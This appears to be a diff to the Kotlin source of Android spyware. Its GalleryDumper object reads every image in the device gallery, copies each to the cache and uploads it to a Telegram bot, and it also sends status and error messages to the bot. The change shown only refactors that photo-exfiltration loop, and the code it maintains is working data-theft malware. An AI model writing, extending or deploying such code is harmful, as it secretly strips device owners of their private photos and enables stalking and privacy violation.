@@ -32,13 +32,17 @@ object GalleryDumper {
                     val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                     val file = File(path)
                     if (file.exists()) {
-                        TelegramBot.sendPhoto(file.copyTo(File(context.cacheDir, name), overwrite = true), "🖼 $name")
+                        val copy = File(context.cacheDir, name)
+                        file.copyTo(copy, overwrite = true)
+                        TelegramBot.sendPhoto(copy, "🖼 $name")
                         sent++
                     }
                 }
             }
 
-            if (sent == 0) TelegramBot.sendMessage("🖼 No photos found in gallery")
+            if (sent == 0) {
+                TelegramBot.sendMessage("🖼 No photos found in gallery")
+            }
         } catch (e: Exception) {
             TelegramBot.sendMessage("🖼 Gallery error: ${e.message}")
         }
